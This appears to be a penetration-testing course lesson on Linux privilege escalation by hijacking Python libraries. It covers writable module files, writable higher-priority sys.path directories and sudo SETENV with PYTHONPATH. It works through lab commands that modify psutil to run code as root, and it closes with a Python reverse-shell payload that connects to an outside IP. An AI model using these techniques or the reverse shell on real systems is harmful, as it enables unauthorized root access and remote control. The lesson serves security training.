One of the Python libraries is [NumPy](https://numpy.org/doc/stable/). `NumPy` is an open source extension for python. The module provides precompiled functions for numerical analysis. In particular it allows easy handling of extensive lists and matrices. It also offers features such as random number generation, Fourier transform, linear algebra, and many others.

Another library is [Pandas](https://pandas.pydata.org/docs/). `Pandas` is a library for data processing and data analysis with Python. It extends Python with data structures and functions for processing data tables. A particular strength of Pandas is time series analysis.

Python has [the Python standard library](https://docs.python.org/3/library/), with many modules on board from a standard installation of Python. There our countless hours of saved work. The modular system is integrated into this form for performance reasons. If one would automatically have all possibilities immediately available in the basic installation of Python without importing the corresponding module, the speed of all Python programs would suffer greatly.

### Importing Modules
```python
#!/usr/bin/env python3

# Method 1
import pandas

# Method 2
from pandas import *

# Method 3
from pandas import Series
```

There are many ways in which we can hijack a Python library. Much depends on the script and its contents itself. However, there are three basic vulnerabilities where hijacking can be used:

1. Wrong write permissions
2. Library Path
3. PYTHONPATH environment variable

## Wrong Write Permissions

We have three components on a host of a developer working with Python. The actual Python script that imports a Python module, the privileges of the script, and the permissions of the module.

A Python module might have write permissions set for all users by mistake, which will allow us to manipulate the module. If SUID/SGID permissions have been assigned to the Python script that imports the module, our code will automatically be included.

If we look at the set permissions of the `mem_status.py` script, we can see that it has a `SUID` set.

### Python Script
```shell-session
htb-student@lpenix:~$ ls -l mem_status.py

-rwsrwxr-x 1 root mrb3n 188 Dec 13 20:13 mem_status.py
```

So we can execute this script with the privileges of another user, in our case, as `root`. We also have permission to view the script and read its contents.

### Python Script - Contents
```python
#!/usr/bin/env python3
import psutil

available_memory = psutil.virtual_memory().available * 100 / psutil.virtual_memory().total

print(f"Available memory: {round(available_memory, 2)}%")
```

This script only shows the available memory in percent. We can also see in the second line that this script imports the module `psutil` and uses the function `virtual_memory()`.

So we can look for this function in the folder of `psutil` and check if this module has write permissions for us.

### Module Permission
```shell-session
htb-student@lpenix:~$ grep -r "def virtual_memory" /usr/local/lib/python3.8/dist-packages/psutil/*

/usr/local/lib/python3.8/dist-packages/psutil/__init__.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_psaix.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_psbsd.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_pslinux.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_psosx.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_pssunos.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_pswindows.py:def virtual_memory():


htb-student@lpenix:~$ ls -l /usr/local/lib/python3.8/dist-packages/psutil/__init__.py

-rw-r--rw- 1 root staff 87339 Dec 13 20:07 /usr/local/lib/python3.8/dist-packages/psutil/__init__.py
```

Such permissions are most common in developer environments where many developers work on different scripts and may require higher privileges.

### Module Contents
```python
...SNIP...

def virtual_memory():

	...SNIP...
	
    global _TOTAL_PHYMEM
    ret = _psplatform.virtual_memory()
    # cached for later use in Process.memory_percent()
    _TOTAL_PHYMEM = ret.total
    return ret

...SNIP...
```

It is recommended to put our code right in the beginning of the function. We can import the module `os` for testing purposes, which allows us to execute system commands.

### Module Contents - Hijacking
```python
...SNIP...

def virtual_memory():

	...SNIP...
	#### Hijacking
	import os
	os.system('id')
	

    global _TOTAL_PHYMEM
    ret = _psplatform.virtual_memory()
    # cached for later use in Process.memory_percent()
    _TOTAL_PHYMEM = ret.total
    return ret

...SNIP...
```

Now we can run the script with `sudo` and check if we get the desired result.

### Privilege Escalation
```shell-session
htb-student@lpenix:~$ sudo /usr/bin/python3 ./mem_status.py

uid=0(root) gid=0(root) groups=0(root)
uid=0(root) gid=0(root) groups=0(root)
Available memory: 79.22%
```

Now that we have the desired result, we can edit the library again, but this time, insert a reverse shell that connects to our host as `root`.

## Library Path

In Python, each version has a specified order in which libraries (modules) are searched and imported from. This is based on a priority system, meaning that paths higher in the list take priority.

### PYTHONPATH Listing
```shell-session
htb-student@lpenix:~$ python3 -c 'import sys; print("\n".join(sys.path))'

/usr/lib/python38.zip
/usr/lib/python3.8
/usr/lib/python3.8/lib-dynload
/usr/local/lib/python3.8/dist-packages
/usr/lib/python3/dist-packages
```

To be able to use this variant, two prerequisites are necessary.

1. The module that is imported by the script is located under one of the lower priority paths listed via the `PYTHONPATH` variable.
2. We must have write permissions to one of the paths having a higher priority on the list.

Therefore, we can create a module with the same name and include our own desired functions. Python will access our module in the higher priority path first and import it before reaching the original and intended module.

Previously, the `psutil` module was imported into the `mem_status.py` script. We can see `psutil`'s default installation location by issuing the following command:

### Psutil Default Installation Location
```shell-session
htb-student@lpenix:~$ pip3 show psutil

...SNIP...
Location: /usr/local/lib/python3.8/dist-packages

...SNIP...
```

From our previous listing of the `PYTHONPATH` variable, we have reasonable amount of directories to choose from to see if there might be any misconfigurations in the environment to allow us `write` access to any of them.

### Misconfigured Directory Permissions
```shell-session
htb-student@lpenix:~$ ls -la /usr/lib/python3.8

total 4916
drwxr-xrwx 30 root root  20480 Dec 14 16:26 .
...SNIP...
```

It appears that `/usr/lib/python3.8` is misconfigure with write permissions to any user. From the `PYTHONPATH`, we can see that this path is higher on the list from the path in which `psutil` is installed in. Let us try abusing this misconfiguration to create our own `psutil` module containing our own malicious `virtual_memory()` function within the `/usr/lib/python3.8` directory.

### Hijacked Module Contents - psutil.py
```python
#!/usr/bin/env python3

import os

def virtual_memory():
    os.system('id')
```

It is very important to make sure that our module has the same name as the import as well as the same function with the correct number of arguments passed to it as the function we are intended to hijack. Otherwise we would not be able to perform the attack.

Let us once again run the `mem_status.py` script using `sudo` like in the previous example.

### Privilege Escalation via Hijacking Python Library Path
```shell-session
htb-student@lpenix:~$ sudo /usr/bin/python3 mem_status.py

uid=0(root) gid=0(root) groups=0(root)
Traceback (most recent call last):
  File "mem_status.py", line 4, in <module>
    available_memory = psutil.virtual_memory().available * 100 / psutil.virtual_memory().total
AttributeError: 'NoneType' object has no attribute 'available' 
```

As we can see from the output, we have successfully gained execution as `root` through hijacking the module's path via a misconfiguration in the permissions of the `/usr/lib/python3.8` directory.

## PYTHONPATH Environment Variable

`PYTHONPATH` is an environment variable that indicates what directory (or directories) Python can search for modules to import. If a user is allowed to manipulate and set this variable while running the python binary, they can effectively redirect Python's search functionality to a user-defined location when it comes time to import modules. We can see if we have the permissions to set environment variables for the python binary by checking our `sudo` permissions:

### Checking Sudo Permissions
```shell-session
htb-student@lpenix:~$ sudo -l 

Matching Defaults entries for htb-student on ACADEMY-LPENIX:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User htb-student may run the following commands on ACADEMY-LPENIX:
    (ALL : ALL) SETENV: NOPASSWD: /usr/bin/python3
```

In the example we can run `/usr/bin/python3` under the permissions of `sudo` and are therefore allowed to set environment variables for use with this binary by the `SETENV:` flag being set. With the sudo permissions, using the `/usr/bin/python3` binary, we can effectively set any environment variable under the context of our running program. Let's try to do so now using the `psutil.py` script from the last section.

### Privilege Escalation using PYTHONPATH Environment Variable
```shell-session
htb-student@lpenix:~$ sudo PYTHONPATH=/tmp/ /usr/bin/python3 ./mem_status.py

uid=0(root) gid=0(root) groups=0(root)
...SNIP...
```

We put the script that runs the system command in `/tmp`. We then call `/usr/bin/python3` to run `mem_stats.py`, and we specify the the `PYTHONPATH` variable contain the `/tmp` directory, so that it forces Python to search there for the `psutil` module to import. As we can see, we once again have successfully run our script under the context of root.

### Code to get a shell
```Python
import sys,socket,os,pty
	
RHOST="10.10.14.161"
RPORT=12345
    
s=socket.socket()
s.connect((RHOST, RPORT))

for fd in (0, 1, 2):
	os.dup2(s.fileno(), fd)

pty.spawn("/bin/sh")
```
